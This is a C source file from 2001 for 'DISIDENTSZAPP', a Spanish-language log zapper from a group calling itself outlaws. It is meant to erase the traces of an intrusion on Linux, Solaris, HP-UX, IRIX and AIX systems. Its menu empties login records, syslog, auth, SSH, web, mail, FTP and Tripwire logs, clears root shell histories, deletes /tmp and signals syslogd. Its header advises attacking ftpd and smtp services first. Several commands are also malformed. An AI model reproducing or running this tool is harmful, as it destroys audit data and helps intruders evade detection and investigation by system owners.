/*--------------------------------------------------------------------------------------------------
                  DISIDENTS - LOS FUERA DE LA LEY 2001 
                        DISIDENTSZAPP by DDiego
--INSTALACION:
1ª Unos guantes, una botella de vodka y un compilador  
2ª gcc -o disidentszapp disidentszapp.c   - Si no sabias lo de los guantes
y el vodka, no creo que lo necesites
-- RECOMENDACIONES
Ir 1ª a por los servicios ftpd, smtp etc y luego darle a la A
-- AYUDA: Si quereis que incluya algun log de otro servicio en el zapper etc, podeis
escribir a disidents@hotmail.com o disidents@yahoo.es, un saludo

2001-06-02                                  
http://www.disidents.int-ltd.com                 
-----------------------------------------------------------------------------------------------------*/ 
 
                            
                  


#include <stdio.h>
main()
{
int c;
int d;
system ("clear");
printf("\n\033[1;31m  \n");
printf("\n------------------ DISIDENTSZAPP by DDiego ---------------------\n");
printf("\n------------- ES YA LA HORA DE LIMPIARNOS EL CULO --------------\n");
printf("\033[0;0m");
printf("\n\033[1;33m1010101010--Menu--1010101010\033[0;0m");
printf("\033[1;30m\n");
printf(" A BORRA TODO LOS LOGS   de opciones (B, C, D, E, F, G,H)\n");       
printf(" B BORRA TODAS LAS ENTRADAS Y SALIDAS\n"); /*/var/log/wtmp */
printf(" C BORRA LAS EL REGISTRO DE CONEXION\n"); /* /var/log/lastlog  */
printf(" D BORRA ULTIMAS ENTRADAS\n"); /*/var/run/utmp */
printf(" E BORRA EL FTP server logfile, usado por wu-ftpd\n");
/*var/log/xferlog */
printf(" F BORRA MESSAGES\n"); /*/var/log/messages*/
printf(" G BORRA LOG  secure\n"); /*/var/log/secure*/
printf(" H BORRA archivos tmp\n"); /*/tmp */
printf(" I BORRA logs de proftpd\n");
printf(" J BORRA logs de apache + SSL\n");
printf(" K BORRA logs de sendmail\n");
printf(" L BORRA logs de qmail\n");
printf(" M BORRA logs de SMB\n");
printf(" N BORRA logs de fingerd\n");
printf(" O BORRA logs de  SSH\n");
printf(" P BORRA logs de  tftp\n");
printf(" Q BORRA logs de  qpopper\n");
printf(" R BORRA logs de  news\n");
printf(" S BORRA logs de  xmail\n");
printf(" T BORRA logs de  thttpd\n");
printf(" U BORRA logs de  Ncftpd\n");
printf(" V BORRA logs de  Telnet\n");
printf(" W BORRA logs de  auth  y auth-priv\n");
printf(" X BORRA logs de  Tripwire\n");
printf("\033[0;0m");
printf("\033[0;32m  ");
printf("---- BORRA logs de otros sistemas - Solaris, HP, IRIX, AIX -------");
printf("\033[0;0m");
printf("\033[1;34m \n");
printf("1 - Solaris (SUN)\n");
printf("2 - HP-UX  (HP)\n");
printf("3 - IRIX (Silicon Graphics)\n");
printf("4 - AIX (IBM)\n");
printf("\033[1;37m5 SALIR a tomar un disparo, tengo sed\033[0;0m\n");

c = getchar ();
switch (c) {
case 'A':
system("echo has hecho una  buena eleccion :D");
system("echo elimininando /var/log/wtmp"); 
system("cat /dev/null > /var/log/wtmp");   
system("echo elimininando /var/log/lastlog");
system("cat /dev/null > /var/log/lastlog"); 
system("echo eliminando /var/run/utmp");
system("cat /dev/null > /var/run/utmp"); 
system("echo eliminando /var/log/xferlog");
system(" cat /dev/null  > /var/log/xferlog"); 
system("echo eliminando /var/log/messages");
system(" cat /dev/null  > /var/log/messages"); 
system("echo elininando /var/log/secure");
system("cat /dev/null  >/var/log/secure"); 
system("echo eliminando /tmp");
system("rm -fr /tmp");
system("echo eliminando  /root/.bash_history");/*nota pueden estar
                            en otro sitio segun esto tu has entrado como root*/
system("cat /dev/null  > /root/.bash_history"); /*bash*/
system("echo eliminando sh_history"); 
system("cat /dev/null  >/root/sh_history");  /*sh*/
system("echo eliminando .sh_history"); 
system("cat /dev/null  > /root/.sh_history");   /*hsh*/
system("echo eliminando  /root/.cshrc  "); /*csh*/
system("cat /dev/null  >  /root/.cshrc ");
system("echo eliminando  /root/.tcshrc"); /*csh*/
 system("cat /dev/null  > /root/.tcshrc");

system("echo eliminando /root/.history"); /*csh*/
system("cat /dev/null  > /root/.history ");  
system("echo eliminando syslogd");
system("killall -HUP syslogd"); 
system("echo ya puedes tomarte un cubata y sonreir");
break;
case'B':
system("echo eliminando /var/log/wtmp");
system("cat /dev/null  > /var/log/wtmp");   
break;
case 'C':
system("echo eliminando /var/log/lastlog");
system("cat /dev/null  >/var/log/lastlog"); 
break;
case 'D':
system("echo eliminando /var/run/utmp");
system("cat /dev/null  >/var/run/utmp"); 
case 'E':
system("echo eliminando /var/log/xferlog");
system("/cat /dev/null  > /var/log/xferlog"); 
break;
case 'F':
system("echo eliminando /var/log/messages");
system("cat /dev/null  > /var/log/messages"); 
break;
case 'G':
system("echo eliminando /var/log/secure");
system("cat /dev/null  > /var/log/secure"); 
break;
case 'H':
system("echo eliminando /tmp");
system("rm -fr  > /tmp");
break;
case 'I':
system("echo eliminando logs de proftpd");
system("cat /dev/null  >  /var/log/proftpd.log");
system("cat /dev/null  >  /var/log/access.log");
system("cat /dev/null  >  /var/log/auth.log.log");
system("cat /dev/null  >  /var/log/proftpd/xferlog.legacy");
system("cat /dev/null  >  /var/log/proftpd.access_log");
system("cat /dev/null  >  /var/log/proftpd.xferlog");
system("cat /dev/null  >   /var/log/proftpd/extended.log");
break;
case 'J':
system("echo eliminando logs de apache");
system("cat /dev/null  >  /var/log/httpd/error_log ");
system("cat /dev/null  >  /var/log/httpd/access_log");
system("cat /dev/null  >  /etc/httpd/logs/access_log");
system("cat /dev/null  >  /etc/httpd/logs/error_log");
system("cat /dev/null  >  /var/log/cgi.log");
system("cat /dev/null  >  /var/log/httpd/cgi.log");
system("cat /dev/null  >  /var/log/httpd-cgi.log");
system("cat /dev/null  >  /var/httpd/logs/ssl.log");
system("cat /dev/null  >  /var/log/httpsd/ssl.access_log");
system("cat /dev/null  >  /var/log/httpsd/ssl_log");
system("cat /dev/null  >  /var/httpd/logs/ssl.log");
system("cat /dev/null  >  /tmp/ssl.log");
system("cat /dev/null  > /var/log/httpsd/ssl.access_log");
break;
case 'K':
system("echo eliminando logs de sendmail");
system("cat /dev/null  >  /etc/mail/access");
system("cat /dev/null  > /var/log/sendmail.log");
system("cat /dev/null  >/var/log/mail.log");
break;
case 'L':
system("echo eliminando logs de qmail");
system("cat /dev/null  > /var/log/qmail");
system("cat /dev/null  > /var/log/smtpd");
break;
case 'M':
system("echo eliminando logs de SMB");
system("cat /dev/null  > /var/log/samba");
system("cat /dev/null  > /var/log/samba/smb.log");
system("cat /dev/null  > /var/log/samba-log.%m ");
system("cat /dev/null  > /var/lock/samba");
break;
case 'N':
system("echo eliminando logs de finger");
system("cat /dev/null  >  /var/log/finger.log");
break;
case 'O':
system("echo eliminando logs de SSH");
system("cat /dev/null  >  /var/log/ssh.log");
system("cat /dev/null  >  /var/adm/ssh.log");
system("cat /dev/null  >  /root/.Xauthority");
break;
case 'P':
system("echo eliminando logs de tftp");
system("cat /dev/null  > /var/log/tftp.log ");
break;
case 'Q':
system("echo eliminando logs de qpopper");
system("cat /dev/null  > /var/log/poplog ");
break;
case 'R':
system("echo eliminando logs de news");
system("cat /dev/null  > /var/log/news.all");
system("cat /dev/null  > /var/log/spooler");
system("cat /dev/null  > /var/log/news");
system("cat /dev/null  > /var/log/news/news");
system("cat /dev/null  > /var/log/news/news.all");
system("cat /dev/null  > /var/log/news/news.crit");
system("cat /dev/null  > /var/log/news/news.err");
system("cat /dev/null  > /var/log/news/news.notice");
system("cat /dev/null  > /var/log/news/suck.err ");
system("cat /dev/null  > /var/log/news/suck.notice");
break;
case 'S':
system("echo eliminando logs de xmail");
system("cat /dev/null  > /var/spool/tmp"); 
system("cat /dev/null  > /var/spool/errors");
system("cat /dev/null  > /var/spool/logs");
system("cat /dev/null  > /var/spool/locks");
break;
case 'T':
system("echo eliminando logs de thttpd");
system("cat /dev/null  > /usr/local/www/logs/thttpd_log");
system("cat /dev/null  > /var/log/thttpd_log");
break;
case 'U':
system("echo eliminando logs de ncftpd");
system("cat /dev/null  > /var/log/ncftpd/%y%m%d/misc%H.%y%m%d"); 
system("cat /dev/null  > /var/log/ncftpd/misclog.txt");
system("cat /dev/null  > /var/log/ncftpd/stat.%Y%m");
system("cat /dev/null  > /var/log/ncftpd/%y%m%d/@SETNAME@/sess%H.%y%m%d");
system("cat /dev/null  > /var/log/ncftpd/sess.%y%m%d");
system("cat /dev/null  > /var/log/ncftpd.errs");
break;
case 'V':
system("echo eliminando logs de telnet");
system("cat /dev/null  > /var/log/telnet.log");
system("cat /dev/null  > /var/log/telnetd");
break;
case 'W':
system("echo eliminando logs de auth");
system("cat /dev/null  >  /var/log/auth.log ");
system("cat /dev/null  > /var/log/auth");
system("cat /dev/null  >  /var/adm/auth.log");
break;
case 'X':
system("echo eliminando logs de Tripwire");
system("cat /dev/null  >  /var/log/tripwire/agent.log ");
break;
case '1':
system("echo eliminando logs de sistema Solaris (SUN)");
system("echo eliminando /var/adm/messages");
system("cat /dev/null  > /var/adm/messages");
system("echo eliminando /var/adm/aculogs ");
system("cat /dev/null  > /var/adm/aculogs ");
system("echo eliminando /var/adm/aculog ");
system("cat /dev/null  > /var/adm/aculog ");
system("echo eliminando /var/adm/sulog");
system("cat /dev/null  > /var/adm/sulog ");
system("echo eliminando /var/adm/vold.log ");
system("cat /dev/null  > /var/adm/vold.log ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  > /var/adm/wtmp ");
system("echo eliminando /var/adm/wtmpx ");
system("cat /dev/null  > /var/adm/wtmpx ");
system("echo eliminando /var/adm/utmp ");
system("cat /dev/null  > /var/adm/utmp ");
system("echo eliminando /var/adm/utmpx ");
system("cat /dev/null  > /var/adm/utmpx ");
system("echo eliminando /var/adm/log/asppp.log ");
system("cat /dev/null  > /var/adm/log/asppp.log ");
system("echo eliminando /var/log/syslog ");
system("cat /dev/null  > /var/log/syslog ");
system("echo eliminando /var/log/POPlog");
system("cat /dev/null  > /var/log/POPlog ");
system("echo eliminando /var/log/authlog ");
system("cat /dev/null  > /var/log/authlog ");
system("echo eliminando  /var/adm/pacct");
system("cat /dev/null  > /var/adm/pacct");
system("echo eliminando /var/lp/logs/lpsched ");
system("cat /dev/null  > /var/lp/logs/lpsched ");
system("echo eliminando /var/lp/logs/lpNet");
system("cat /dev/null  > /var/lp/logs/lpNet ");
system("echo eliminando /var/lp/logs/requests");
system("cat /dev/null  > /var/lp/logs/requests");
system("echo eliminando /var/cron/log ");
system("cat /dev/null  > /var/cron/log ");
system("echo eliminando /var/saf/_log ");
system("cat /dev/null  > /var/saf/_log ");
system("echo eliminando /var/saf/port/log");
system("cat /dev/null  > /var/saf/port/log");
break;
case '2':
system("echo eliminando logs de sistema HP");
system("echo eliminando /var/adm/sulog ");
system("cat /dev/null  > /var/adm/sulog ");
system("echo eliminando /var/adm/btmp ");
system("cat /dev/null  > /var/adm/btmp > ");
system("echo eliminando /var/adm/utmp ");
system("cat /dev/null > /var/adm/utmp > ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  > /var/adm/wtmp ");
system("echo eliminando /var/adm/dtmp ");
system("cat /dev/null  > /var/adm/dtmp ");
system("echo eliminando /var/adm/pacct ");
system("cat /dev/null  > /var/adm/pacct ");
system("echo eliminando /var/adm/nettl.LOG00");
system("cat /dev/null  > /var/adm/nettl.LOG00");
system("echo eliminando /var/adm/rbootd.log ");
system("cat /dev/null  > /var/adm/rbootd.log ");
system("echo eliminando /etc/rc.log ");
system("cat /dev/null  > /etc/rc.log ");
system("echo eliminando /var/adm/rpc.lockd.log ");
system("cat /dev/null  > /var/adm/rpc.lockd.log ");
system("echo eliminando /var/adm/rpc.statd.log ");
system("cat /dev/null  /var/adm/rpc.statd.log > ");
system("echo eliminando /etc/shutdownlog ");
system("cat /dev/null  > /etc/shutdownlog ");
system("echo eliminando /var/adm/snmpd.log ");
system("cat /dev/null  > /var/adm/snmpd.log ");
system("echo eliminando /var/adm/automount.log ");
system("cat /dev/null  > /var/adm/automount.log ");
system("echo eliminando /var/adm/syslog/boot ");
system("cat /dev/null  > /var/adm/syslog/boot ");
system("echo eliminando /var/adm/syslog/mail.log ");
system("cat /dev/null  > /var/adm/syslog/mail.log ");
system("echo eliminando /var/adm/syslog/syslog.log ");
system("cat /dev/null  > /var/adm/syslog/syslog.log ");
system("echo eliminando /var/adm/cron/log ");
system("cat /dev/null  > /var/adm/cron/log ");
system("echo eliminando /var/adm/sw/swagent.log ");
system("cat /dev/null  > /var/adm/sw/swagent.log ");
system("echo eliminando /var/spool/sw/swagent.log ");
system("cat /dev/null  > /var/spool/sw/swagent.log ");
system("echo eliminando /var/adm/sw/swagentd.log ");
system("cat /dev/null  > /var/adm/sw/swagentd.log ");
system("echo eliminando /var/adm/sw/swconfig.log");
system("cat /dev/null  >  /var/adm/sw/swconfig.log ");
system("echo eliminando /var/adm/sw/swinstall.log ");
system("cat /dev/null  >  /var/adm/sw/swinstall.log ");
system("echo eliminando /var/adm/sw/swmodify.log ");
system("cat /dev/null  >  /var/adm/sw/swmodify.log ");
system("echo eliminando /var/adm/sw/swremove.log ");
system("cat /dev/null  >  /var/adm/sw/swremove.log ");
system("echo eliminando /var/adm/lp/log ");
system("cat /dev/null  >  /var/adm/lp/log ");
system("echo eliminando /var/adm/lp/lpd.log ");
system("cat /dev/null  >  /var/adm/lp/lpd.log ");
system("echo eliminando /usr/spool/mqueue/POPlog ");
system("cat /dev/null  > /usr/spool/mqueue/POPlog  ");
break;
case '3':
system("echo eliminando logs de sistema IRIX (Silicon Graphics)");
system("echo eliminando /var/adm/SYSLOG ");
system("cat /dev/null  >  /var/adm/SYSLOG ");
system("echo eliminando /var/adm/sulog ");
system("cat /dev/null  >  /var/adm/sulog ");
system("echo eliminando /var/adm/utmp ");
system("cat /dev/null  >  /var/adm/utmp ");
system("echo eliminando /var/adm/utmpx ");
system("cat /dev/null  >  /var/adm/utmpx ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  >  /var/adm/wtmp ");
system("echo eliminando /var/adm/wtmpx ");
system("cat /dev/null  >  /var/adm/wtmpx ");
system("echo eliminando /var/adm/lastlog/username ");
system("cat /dev/null  >  /var/adm/lastlog/username ");
system("echo eliminando /usr/spool/lp/log ");
system("cat /dev/null  >  /usr/spool/lp/log ");
system("echo eliminando /var/adm/lp/lpd-errs ");
system("cat /dev/null  > /var/adm/lp/lpd-errs  ");
system("echo eliminando /usr/lib/cron/log ");
system("cat /dev/null  >  /usr/lib/cron/log ");
system("echo eliminando /var/adm/loginlog ");
system("cat /dev/null  >  /var/adm/loginlog ");
system("echo eliminando /var/adm/pacct ");
system("cat /dev/null  >  /var/adm/pacct ");
system("echo eliminando /var/adm/dtmp ");
system("cat /dev/null  >  /var/adm/dtmp ");
system("echo eliminando /var/adm/acct/sum/loginlog ");
system("cat /dev/null  >  /var/adm/acct/sum/loginlog ");
system("echo eliminando /var/adm/X0msgs ");
system("cat /dev/null  >  /var/adm/X0msgs ");
system("echo eliminando /var/adm/crash/vmcore ");
system("cat /dev/null  >  /var/adm/crash/vmcore ");
system("echo eliminando /var/adm/crash/unix ");
system("cat /dev/null  >  /var/adm/crash/unix");
break;
case '4':
system("echo eliminando logs de sistema AIX (IBM)");
system("echo eliminando /var/adm/pacct ");
system("cat /dev/null  >  /var/adm/pacct ");
system("echo eliminando /var/adm/wtmp ");
system("cat /dev/null  >  /var/adm/wtmp ");
system("echo eliminando /var/adm/dtmp ");
system("cat /dev/null  >  /var/adm/dtmp ");
system("echo eliminando /var/adm/qacct ");
system("cat /dev/null  >  /var/adm/qacct ");
system("echo eliminando /var/adm/sulog ");
system("cat /dev/null  >  /var/adm/sulog ");
system("echo eliminando /var/adm/ras/errlog ");
system("cat /dev/null  >  /var/adm/ras/errlog ");
system("echo eliminando /var/adm/ras/bootlog ");
system("cat /dev/null  > /var/adm/ras/bootlog  ");
system("echo eliminando /var/adm/cron/log  ");
system("cat /dev/null  >  /var/adm/cron/log ");
system("echo eliminando /etc/utmp ");
system("cat /dev/null  >  /etc/utmp ");
system("echo eliminando /etc/security/lastlog ");
system("cat /dev/null  > /etc/security/lastlog  ");
system("echo eliminando /etc/security/failedlogin ");
system("cat /dev/null  > /etc/security/failedlogin  ");
system("echo eliminando /usr/spool/mqueue/syslog ");
system("cat /dev/null  >  /usr/spool/mqueue/syslog ");
break;
case '5':
system ("clear");
printf("\n\033[1;30m  \n");
printf("                    ---------  ------- ----------------\n");
printf("       --------------------   -------   ----------------------\n");
printf(" -----------------------               -------------------------\n");
printf("-------------------------          ------------------------------\n");
printf(" ----------------                             ------------------\n");
printf("    ----------------------------------------------------\n");
printf("           ------------------------------------\n");
printf("\n\033[1;31mDISIDENTS 2001 - LOS FUERA DE LA LEY\033[0;0m\n");
return 0;
}
}











